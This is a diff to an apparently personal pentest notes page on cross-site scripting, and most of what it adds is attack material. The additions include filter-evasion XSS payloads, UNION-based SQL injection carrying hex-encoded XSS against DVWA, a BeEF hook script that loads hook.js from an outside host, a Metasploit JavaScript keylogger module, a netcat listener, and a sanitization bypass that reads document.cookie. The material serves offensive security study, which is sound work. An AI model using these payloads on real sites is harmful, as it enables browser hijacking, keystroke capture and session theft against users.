@@ -106,13 +106,13 @@ app.listen(port, () => {
 {% endtab %}
 {% endtabs %}
 
-<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
 
 I will try use some tags to test rxss <mark style="color:red;">**`'"><h1>Hacked</h1>`**</mark>
 
 <mark style="color:blue;">**`the best`**</mark> **`'"><h1>Hacked</h1>{7*7}}JyI+PGgxPmhhY2tlZDwvaDE+`**
 
-<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
 
 Ok this search Vulnerable HTML injection &&  RXSS
 
@@ -122,11 +122,11 @@ Simple JS payload
 <script>alert('OSCP+EWAPTXv2')</script>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/ezgif-4-f7b8aedabd.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ezgif-4-f7b8aedabd.gif" alt=""><figcaption></figcaption></figure>
 
 ### Stored XSS
 
@@ -297,7 +297,7 @@ in website&#x20;
 nc -nvlp 4444
 ```
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 ## How to Bypass Protection
 
@@ -330,11 +330,36 @@ nc -nvlp 4444
 <script>confirm()</script>
 ```
 
+&#x20;  • Background image manipulation:
+
+```
+<body background="javascript:alert('Successful XSS')">
+
+<div style="background-image:url(javascript:alert('Successful XSS'))">
+
+<input type="image" src="javascript:alert('Successful XSS')">
+
+<meta http-equiv="refresh" content="0;url=data:text/html
+base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+<head><meta http-equiv="content-type" content="text/html; charset=utf-7"></head>+adwscript+ad4-alert('xss');+adw-/script+ad4-
+```
+
+
+
+* eval
+
+```
+<body onload="eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))">
+```
+
 * Without closing the angular bracket (>)
 
 ```
 <svg onload=confirm()//
 ```
+
+
 
 Ex :
 
@@ -438,3 +463,235 @@ echo "</h1>" ;
 
 ## Escalating the Attack
 
+### XSS to SQL Injection (XSSQLi)
+
+&#x20;XSS Injection with SQLi (XSSQLi) Well After our discussion on different types of injection and places you can find SQL injection Vulnerability, an attacker can successfully exploit an SQL injection vulnerability and get access to the database and if he is lucky enough to get access to the File System also by uploading shell
+
+IN DVWA DEMO
+
+
+
+```
+http://192.168.2.5/dvwa/vulnerabilities/sqli/?id=1
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+i will use <mark style="color:red;">**`OR 6=6#`**</mark> to test &#x20;
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Ok i will Try Use union Attack
+
+```sql
+1' union select 1,2#
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Ok  Try again UNION Attack to make XSSSQi&#x20;
+
+\<svg src=x onload=alert(/H3ckt00r/)>
+
+Make  Encoded to HEX && ad 0x in begin payload
+
+**`0x3c737667207372633d78206f6e6c6f61643d616c657274282f4833636b743030722f293e53`**
+
+```sql
+1' UNION SELECT 1,0x3c737667207372633d78206f6e6c6f61643d616c657274282f4833636b743030722f293e53#
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+B0000000000M!!
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+### BEEF-XSS
+
+```
+                                     .O,       
+                                     lkOl                             
+                                     od cOc                           
+                                     'X,  cOo.                        
+                                      cX,   ,dkc.                     
+                                       ;Kd.    ,odo,.                 
+                                        .dXl   .  .:xkl'              
+                                          'OKc  .;c'  ,oOk:           
+                                            ,kKo. .cOkc. .lOk:.       
+                                              .dXx.  :KWKo. 'dXd.     
+                                                .oXx.  cXWW0c..dXd.   
+                                                  oW0   .OWWWNd.'KK.  
+                                          ....,;lkNWx     KWWWWX:'XK. 
+ ,o:,                          .,:odkO00XNK0Okxdlc,.     .KWWWWWWddWd 
+  K::Ol                   .:d0NXK0OkxdoxO'             .lXWWWWWWWWKW0 
+  od  d0.              .l0NKOxdooooooox0.        .,cdOXWWWWWWWWWWWWWx 
+  :O   ;K;           ;kN0kooooooooooooK:  .':ok0NWWWWWWWWWWWWWWWWWWK. 
+  'X    .Kl        ;KNOdooooooooooooooXkkXWWWWWWWWWWWWWWWWWWWWWWWNd.  
+  .N. o. .Kl     'OW0doooooooooooooodkXWWWWWWWWWWWWWWWWWWWWWWWW0l.    
+   0l oK' .kO:';kNNkoooooooooooook0XWWWWWWWWWWWWWWWWWWWWWWWKx:.       
+   lX.,WN:  .:c:xWkoooooooooood0NWW0OWWWWWWWWWWWWWWWWWWWKo.           
+    0O.0WWk'   .XKoooooooooooONWWNo  dWWWWWWWWWWWWWWWWWl              
+     oKkNWWWX00NWXdooooooooxXWWNk'   dWWWWWWWWWWWWWWWWX               
+      .cONWWWWWWWWOoooooooONWWK:...c0WWWWWWWWWWWWWWWWWW:              
+         .;oONWWWWxooooodKWWWWWWWWWWWWWWWWWWWWWWWWWWWWWX.             
+              'XW0oooookNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWd             
+              oW0ooooo0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWO             
+             ;NXdooodKWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWx             
+          ;xkOOdooooxOO0KNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWX.             
+         .NOoddxkkkkxxdoookKWWWWWWWWWWWWWWWWWWWWWWWWWWX'              
+          :KNWWWWWWWWWWX0xooONWWWWWWWWWWWWWWWWWWWWWWWk.               
+         .xNXxKWWWWWWWOXWWXxoKWWWWWWWWWWWWWWWWWWWWNk'                 
+         OWl cNWWWWWWWk oNWNxKWWWWWWWWWWWWWWWWWNOl.                   
+        ,Wk  xWWWWWWWWdxWWNWWWWWWWWWWWWXOdc,.                       
+        .N0   lOXNX0x;  .KWWWWWWWWWWWNkc.                             
+         :NO,         'lXWWWWWWWWWNk:.                                
+          .dXN0OkxkO0NWWWWWWWWWWKl.                                   
+             .';o0WWWWWWWWWWWNk;                                      
+                  .cxOKXKKOd;.                                        
+                                    
+```
+
+
+
+```javascript
+<script src="http://192.168.1.9:3000/hook.js"></script>
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+[WriteUP](https://medium.com/@secureica/hooking-victims-to-browser-exploitation-framework-beef-using-reflected-and-stored-xss-859266c5a00a)
+
+### XSS - Keyloger
+
+```
+use auxiliary/server/capture/http_javascript_keylogger
+run
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+### XSS Session Hijacking
+
+Stored XSS + Session Hijacking
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Weak Session IDs Source&#x20;
+
+```php
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    if (!isset ($_SESSION['last_session_id'])) {
+        $_SESSION['last_session_id'] = 0;
+    }
+    $_SESSION['last_session_id']++;
+    $cookie_value = $_SESSION['last_session_id'];
+    setcookie("dvwaSession", $cookie_value);
+}
+?> 
+```
+
+in the code if last\_session exist make last\_session = 0
+
+
+
+### XSS Bypass Sanitization
+
+{% code overflow="wrap" %}
+```php
+<!DOCTYPE html>
+<html>
+    <body>
+        <?php
+            function sanitise_username($username) {
+                return strtr(
+                    htmlentities ($username, ENT_QUOTES),
+                    [';' => '']
+                );
+            }
+        ?>
+        <a href="#!" onclick="javascript:myFunction('/profile/<?php echo sanitise_username($_GET["user"]) ?>')">Profile</a>
+    
+        <script>
+            function myFunction(url) {
+                // do something
+                location.href=url
+            }
+        </script>
+    </body>
+</html>
+```
+{% endcode %}
+
+
+
+```
+')-alert('a
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Exploit using Arithmetic Operators
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+```javascript
+ /?user=')|eval('onload=a'.concat('lert(document.cookie)'))//
+```
+
+```javascript
+http://192.168.1.3/web/vulnapp.php%20/?user=%27)|eval(%27onload=a%27.concat(%27lert(document.cookie)%27))//#!
+```
+
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+```javascript
+ /?user='),alert?.('document.cookie//
+```
+
+Which sinks can lead to DOM-XSS vulnerabilities?
+
+&#x20;The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
+
+```
+document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+
+```
+
+he following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
+
+```
+add()
+after()
+append()
+animate()insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+```
